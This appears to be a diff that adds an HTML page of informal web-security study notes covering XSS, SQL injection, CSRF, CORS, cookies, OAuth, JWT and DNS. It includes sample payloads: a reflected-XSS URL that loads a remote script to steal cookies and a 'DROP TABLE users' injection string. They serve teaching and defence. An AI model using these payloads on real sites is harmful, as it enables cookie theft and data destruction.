@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Security</title>
+    <style>
+      p + p {
+        margin-top: 1em;
+      }
+
+      .background-code {
+        code {
+          background-color: #e2e1e1;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Security</h1>
+    <main>
+      <strong
+        >The #1 security technique is to never trust data from the browser (URL parameters, POST
+        bodies, HTTP headers, cookies, uploaded files, etc.)</strong
+      >
+
+      <h2>General Good Practices</h2>
+      <section>
+        <ul>
+          <li>Strong passwords or passkeys & 2FA</li>
+          <li>HTTPS, never HTTP</li>
+          <li>
+            Only store and display sensitive information as necessary (hide passwords and credit
+            card numbers, though this only protects from other users physically seeing the
+            information)
+          </li>
+          <li>
+            <a href="https://owasp.org/www-community/Vulnerability_Scanning_Tools"
+              >Vulnerability scanning tools</a
+            >
+          </li>
+        </ul>
+      </section>
+
+      <h2>XSS (Cross-Site Scripting)</h2>
+      <section>
+        <p>
+          <strong>Reflected:</strong> user content is returned by the server immediately and
+          unmodified. <br />
+          Ex: emailing the following link to a user to steal their cookies:
+          <code
+            >http://developer.mozilla.org?search=beer&lt;script%20src="http://example.com/tricky.js"&gt;&lt;/script&gt;</code
+          >
+        </p>
+        <p>
+          <strong>Persistent:</strong> when malicious content is stored by the site and distributed
+          to users. <br />
+          Ex: a commenting system that supports unmodified HTML, which thus allows users to insert
+          scripts.
+        </p>
+
+        <p>Always sanitize user inputs and/or disable the markup (maybe via some container)</p>
+        <ul>
+          <li>from the URL</li>
+          <li>from anything that allows submitting text or files that will be rendered</li>
+        </ul>
+        <p>
+          Elements to scrub include <code>&lt;script&gt;</code>, <code>&lt;object&gt;</code>,
+          <code>&lt;embed&gt;</code>, and <code>&lt;link&gt;</code>.
+        </p>
+      </section>
+
+      <h2>SQL Injection</h2>
+      <section>
+        <p>Always santize/escape user-provided inputs into SQL commands.</p>
+        <p class="background-code">
+          Malicious example:
+          <code>statement = "SELECT * FROM users WHERE name = '" + userName + "';"</code> when
+          provided with <code>a';DROP TABLE users;</code> becomes
+          <code>SELECT * FROM users WHERE name = 'a';DROP TABLE users; </code>
+        </p>
+      </section>
+
+      <h2>CSRF (Cross-Site Request Forgery)</h2>
+      <section>
+        <p>
+          Cookies are always sent regardless of the referrer, so always use a token (not in cookie
+          form) to verify that the request is coming from the user through means that your site
+          expects.
+        </p>
+        <p>
+          Ex: Someone creates a page with a hidden script that submits a Venmo
+          <code>POST</code> request to send money to their account. Since cookies are sent
+          regardless of the referrer, the <code>POST</code> will be successful unless the
+          <code>POST</code> requests are protected by CSRF tokens that are generated per
+          transaction.
+        </p>
+      </section>
+
+      <h2>Clickjacking</h2>
+      <section>
+        <p>
+          Always set your CSP (Content Security Policy) headers to avoid your site being served in
+          an iframe on malicious sites.
+        </p>
+        <p>
+          This attack allows attackers to overlay their own content invisibly and intercept entered
+          information or have you perform actions accidentally, such as clicking a button that
+          appears to do one thing but is acutally overlaid with a 1-click order button on Amazon
+          loaded in an iframe (if 1-click orders are enabled and your cookies have you signed in).
+        </p>
+      </section>
+
+      <h2>DDOS (Distributed Denial of Service)</h2>
+      <section>
+        <p>
+          Involved overhleming a web application's bandwidth or a certain application-level
+          bottleneck.
+        </p>
+        <p>
+          Some mitigation options are load balancers, rate limiting, and services that specifically
+          track for unusual IP traffic.
+        </p>
+      </section>
+
+      <h2>Directory Traversal</h2>
+      <section>
+        Occurs when user is able to pass unsanitized file names/paths to server using navigation
+        characters like <code>../</code>.
+      </section>
+
+      <h2>File Inclusion</h2>
+      <section>
+        <p>
+          Allows for loading an unintended file on the server-side, such as not santiizing when
+          allowing a user to specificy a URL/path/anything to be input to code that accepts
+          URLs/paths.
+        </p>
+      </section>
+
+      <h2>Command Injection</h2>
+      <section>
+        <p>Happens when unsanitized user input can be supplied to a system shell server-side.</p>
+      </section>
+
+
+      tls compression was outlawed (vulnerable to CRIME) because it compresses the entire response (header (csrf cookie) and content (csrf token)) but breach is for http compression (only content) and is still vulnerable
+      BREACH and CRIME attacks are able to determine client secrets in cookies one-character at a time. CRIME was for sending *requests* to a URL with (for example) 'secret=1' in the body and checking the compressed size of the request.
+      BREACH is for sending '?name=csrf_token=1' in the URL if the URL query (or body content) is reflected in the returned response (like a form that says "Hello csrf_token=1!") and checking if the compressed response is smaller.
+      HTTP2 header compression HPACK and HTTP3 QPACK is much less vulnerable to CRIME because it compresses headers in a different way (effectively immune)
+      Django mitigates BREACH by prepending a random mask to CSRF tokens per request (so the attacker can't determine the token from the compressed response). This prevents guessing the token character by character.
+
+      CORS is who ELSE can use MY api (relaxing of security, default is SOP), i.e., granting access to others.
+      CSP is who ELSE can run content on MY page (tightening of security), locking down what you run on your page. They are sort of opposites.
+      CORS is DEFAULT secure (setting no CORS headers is equivalent to setting 'same-origin' policy), setting values is what can open security issues if you aren't specific. CORS should always be considered as opening up a vulnerability that needs to be assessed.
+      CORS is browser-level, prevents requests to your APIs from other domains. If proxied by an evil site backend (since no browser to block the cors request), it will send, but the cookies won't be seen by the evil proxy
+      CORS is inherently not able to prevent token-based security issues besides rate-limiting spam and checking for malicious indicators
+      CORS is not endpoint security, it's browser/JS security to relax SOP for your desired origins (because 'Origin' header is forbidden from being set by anything but the user-agent)
+      CORS pre-flight - OPTIONS
+      CORS doesn't apply to navigation requests (GET and most importantly POST), so it cannot prevent CSRF
+      CORS applies to fetch(), CSS web fonts, CSS shapes that use images, and WebGL textures (since the later two allow inspecting the image data from JS, which is a security risk).
+      CORS only prevents browser from reading the response, but the browser will still send the request and the server will process it (because Origin header can be spoofed, so there is no security benefit to trying to prevent it on the server side). The exception is preflight OPTIONS, which will prevent the request from being sent if the server doesn't respond with the correct headers.
+
+      No way to stop people from hosting your images, so may incur transfer costs so consider hosting them in a non-public way, requiring a token to access them or something similar
+      img/video elements have no CORS restrictions and can load anything BUT the JS cannot access their data unless crossorigin attribute is set
+      CSRF is not fully protected via SameSite cookies due to subdomains if you host user-generated content (should probably be on a different domain altogether) or the subdomains CNAMEs to a site out of your control (vendor, etc.), but otherwise does
+      Server should check origin header and reject if not allowed (this can be spoofed, but it's better than nothing in case CORS or cookie samesite was set poorly)
+      Same-Origin Policy (origin is defined as scheme-host-port) applies to iframe, link, form, img, audio/video, script
+      Same-origin also applies to local/session storage as well, but not cookies (why the flag is called 'samesite')
+      Cookie security? SameSite, Secure, HttpOnly, and Domain/Path
+      NOTE: SameSite=Strict is often not desired because it breaks the back button and external links to your site, so Lax is often used
+      Basic auth is username@passowrd
+      URL hashes are NOT sent outside the browser, so clients can use them to store data that doesn't need to be sent to the server
+      NEVER store sensitive data in local/session storage (unless it is short lived and the risk has been evaluated), only in cookies with the proper flags (secure, httponly, samesite, etc.), then implement a proxy (BFF - backend for frontend) to put it into the header if you decide at a later point you need to support non-browser use cases
+      Encryption/clever strategies does very little to stop XSS from accessing local/sessionstorage
+      XSS is the MOST important security vulnerability to avoid
+      Web worker can be used with access tokens + refresh tokens to store the access token in memory and the refresh token only in the worker (this way the browser never has access to the refresh token)
+      setting cookies: no domain = ONLY current sub/domain, domain = that domain and all subdomains (can set any parent domain), no path = applies to entire domain, path = only applies to that path and its subdirs
+      JWT is a token that is signed by the server with a secret key according to the content of the header and payload portions and can be verified by the server (with the same secret key or a public key) - this makes them tamper proof
+      Since only the key is needed to validate JWT, it avoids session horizontal scaling difficulties or having to hit authorization server for every request
+      But this makes JWT very risky since it cannot be invalidated and doesn't need authorization validation from the server, so refresh tokens are longer lived and authorization tokens are short lived
+      Refresh tokens can be invalidated, so an old auth token is only valid until it expires
+      Refresh token rotation can be implemented where a new refresh token is used each time you refresh the auth token, which can help detect if an old refresh token was stolen and to invalidate the chain but this is not foolproof and only hardens the chance of the refresh token being stolen in transit, not from XSS
+      Secrets or sensitive info should never end up in frontend applications if possible
+      BFF is a reverse proxy that holds onto sensitive info for the client, so it holds onto the refresh token and sends the client the ENCRYPTED (and preferably signed) access token and refresh token (so it is not usable by the client but can be passed to the server as needed)
+      BFF SHOULD perform client authentication (pre set up a client ID and secret with the auth provider) with the OAuth server to ensure a stolen refresh token or auth code (visible in URL) is not usable because they don't have the BFF secret
+      Clients should never need to directly interface with tokens (JWT or otherwise) - they should be passed to a user info API - so they should be kept in HttpOnly cookies which protect from XSS extraction though session riding still exists
+      the BFF being on the same domain as your frontend allows for easy cookie managament instead of 3rd party
+      Session riding is one of the largest cookie risks outside of CSRF
+      BFFs can inspect traffic to partially mitigate session riding (steps out of order, requests coming in too fast)
+      If you are already using sessions, the tokens can be stored in the session and the BFF (or whatever handles your sessions) will retrieve and pass them on requests
+      OAuth2 (1 is deprecated): resource owner (user), client (app), authorization server (3rd party auth server), resource server (3rd party API), authorization grant, redirect URI (passed by client to redirect User after grant), access token
+      Access token is for authorization (using APIs), ID token is for authentication (proving your identity/being signed in)
+      ID token should NOT be shared with 3rd party APIs since it identifies the user
+      OAuth explicit flow sends auth code (limited TTL) in redirect URL to the client, which is then exchanged for access token and refresh token (usually by a BFF server to keep the plain text tokens out of the browser)
+      OAuth implicit flow sends access token directly in redirect URL hash fragment, which is less secure because the clients have access to the tokens from the URL (though your redirect URL won't see it because hash fragments are not passed out of the browser - this was initially a protection against non-SSL servers in the early days of adoption of HTTPS)
+      OAuth Resource owner password credentials flow (DEPRECATED) and client credentials (most common for machine-to-machine communication)
+      OAuth scopes determine what the client can do with the token (read, write, etc.) / generates the consent screen the user grants (scopes are defined by the auth provider)
+      Network terminology: back channel = highly secure, front channel = much less secure
+      If you're going to use a session ID, you should sign it with a secret key to prevent tampering (HMAC is good for this)
+      Bearer token means that "if you bear the token, you have the access it provides", i.e., it is all the proof needed to perform the action being checked
+      OAuth is for authorization (no defined way to get user info from the OAuth flow), OIDC (open ID connect, OID2 is deprecated) is for authentication and is built on top of OAuth
+      OIDC declares an ID token and a UserInfo endpoint (which received a JWT) to get more complete user info (plus standardized scopes and implementation)
+      AppAuth is a library that handles the OAuth flow for mobile apps 
+      Browsers don't cache requests across domains (some also include the frame site, so you should not rely on a CDN to download libraries from a different domain, you will not get any benenfit from the user possibly having the file cached from elsewhere)
+
+      HTTPS URLs are encrypted in requests/responses because they are in the header, BUT look at DNS following part
+      DNS communication is usually sent plain text via UDP to the DNS server on port 53 (hence Amazon's Route53) before establishing TLS connection with your domain (only the domain is sent, not the full URL)
+      DNS over TLS (DoT) and DNS over HTTPS (DoH) (both use TCP, not UDP) establishes an encrypted session with the DNS server, so that the domain you are querying isn't leaked (DoT is over a separate port)
+      DoT is over port 853 while DoH is over 443 (HTTPS port): this makes DoT easier for security because servers can analyze the DNS traffic specifically, where DoH is better for privacy because it is indistinguishable from standard HTTPS traffic
+      DNSSEC is a form of private/public key signing of DNS records by DNS servers to ensure that the DNS data (note: not the response itself) is not tampered with in transit
+      DNSSEC also validates that the data came from the zone it was supposed to: this is only because you can trust the public key because each higher level zone signs (with their private key) the public keys of their child zones.
+      So DNSSEC ensures authentication and integrity of the DNS data (note: the root zone has no signed public key since it has no parent, and since the root zone signs all the TLD zones' keys, an intercept at the root level would fail to validate the TLD keys and the DNS resolution would error)
+      
+      A DNS query goes from your browser to a recursive resolver, which bounces between authoritative DNS servers to get the finalized IP address to return to you: first the root servers (13 globally) then the TLD (top-level domain) servers (like .com) then the authoritative servers for the domain
+      Recursive resolvers cache the results of the DNS query for a TTL (time to live) to reduce the number of queries to the authoritative servers, which is where a cache-poisoning attack can come in where a malicious server returns a fake IP address to the recursive resolver
+
+      Session fixation attack is bad actor gets anonymous (or known) session id cookie, bad actor passes the session to the victim, victim logs in, if the site doesn't create a new session then the bad actor now can log in with the same session ID and is in the victim's account (fix is to always create a new session ID when a user auths)
+      Session fixation is also possible with subdomains setting cookies on the parent domain, which WILL overwrite any conflicting cookies set on the parent domain (so beware of user-generated content on subdomains)
+      '.domain' cookies (setting an explicit domain) take precedence over 'domain' cookies (no domain was set), but they don't actually overwrite them
+
+      NOT SECURITY:
+      delineate happy path with BDD and determine unhappy paths as the branches that weren't taken in the happy path (to make sure unknowns are covered), rapid prototype happy path to cover unknown unknowns, TDD the happy path properly and then the unhappy paths by severity
+      HTTP: POST creates a new resource, PUT updates the WHOLE resource (idempotent, should think of it as overwriting ALL of what is already there with the new content), PATCH updates a resource partially, DELETE removes a resource, GET retrieves a resource, HEAD retrieves just the header (maybe to check content-length before downloading a large file), OPTIONS is a CORS thing
+    </main>
+  </body>
+</html>
